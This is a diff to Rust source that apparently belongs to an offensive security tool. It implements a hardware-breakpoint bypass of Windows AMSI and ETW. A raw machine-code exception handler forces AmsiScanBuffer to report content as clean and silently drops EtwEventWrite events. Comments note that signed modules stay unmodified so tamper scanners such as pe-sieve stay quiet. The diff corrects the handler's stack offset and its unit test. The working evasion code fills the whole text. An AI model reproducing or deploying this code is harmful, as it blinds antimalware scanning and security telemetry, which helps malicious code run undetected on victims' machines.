@@ -10,7 +10,9 @@
 //! - `EtwEventWrite`  → handler sets Rax = 0 (STATUS_SUCCESS) and resumes
 //!   at the function's first `ret`: the event is dropped, caller happy.
 //! - `AmsiScanBuffer` → Rax = 0 (S_OK), `*AMSI_RESULT` (6th argument, at
-//!   `[Rsp+0x28]` on entry) = 0 (`AMSI_RESULT_CLEAN`), resume at `ret`.
+//!   `[Rsp+0x30]` on entry — arg5's home slot is +0x28; found live
+//!   during ABR-T041 validation which exercised the same retirement for
+//!   real) = 0 (`AMSI_RESULT_CLEAN`), resume at `ret`.
 //!
 //! Zero bytes of any signed module are modified, so hash-based tamper
 //! detection (pe-sieve "hooked/replaced") stays quiet. The trade is the
@@ -67,7 +69,7 @@ const DR7_TWO_EXECUTE: u64 = 0x3;
 /// 40: mov qword [rdx+0x78],0     ; Rax = S_OK
 /// 4B: mov rax,[rdx+0x98]         ; Rsp
 /// 52: test rax,rax / jz .skip
-/// 5B: mov rcx,[rax+0x28]         ; 6th arg: AMSI_RESULT*
+/// 5B: mov rcx,[rax+0x30]         ; 6th arg: AMSI_RESULT* (arg5 home is +0x28)
 /// 5F: test rcx,rcx / jz .skip
 /// 68: mov dword [rcx],0          ; AMSI_RESULT_CLEAN
 /// 6E: .skip  add r10,[r11+24]    ; += amsi skip-to-ret
@@ -85,7 +87,7 @@ const HANDLER: [u8; PARAMS_OFFSET] = [
     0x00, 0xE9, 0x43, 0x00, 0x00, 0x00, 0x4D, 0x39, 0x53, 0x08, 0x0F, 0x85,
     0x3F, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x48, 0x8B, 0x82, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85,
-    0xC0, 0x0F, 0x84, 0x13, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x28, 0x48,
+    0xC0, 0x0F, 0x84, 0x13, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x30, 0x48,
     0x85, 0xC9, 0x0F, 0x84, 0x06, 0x00, 0x00, 0x00, 0xC7, 0x01, 0x00, 0x00,
     0x00, 0x00, 0x4D, 0x03, 0x53, 0x18, 0x4C, 0x89, 0x92, 0xF8, 0x00, 0x00,
     0x00, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3, 0x31, 0xC0, 0xC3, 0x00, 0x00,
@@ -328,11 +330,11 @@ mod tests {
             "etw target: Rip at ret"
         );
 
-        // AMSI target: S_OK, AMSI_RESULT (6th arg at [Rsp+0x28]) CLEAN,
+        // AMSI target: S_OK, AMSI_RESULT (6th arg at [Rsp+0x30]) CLEAN,
         // Rip at the ret.
         let mut result: i32 = 0x7f;
         let mut stack = [0u64; 16];
-        stack[5] = &mut result as *mut i32 as usize as u64; // [rsp+0x28]
+        stack[6] = &mut result as *mut i32 as usize as u64; // [rsp+0x30] arg6
         let mut ctx = Ctx([0u8; 0x410]);
         put(&mut ctx, RIP, amsi as u64);
         put(&mut ctx, RSP, stack.as_ptr() as u64);
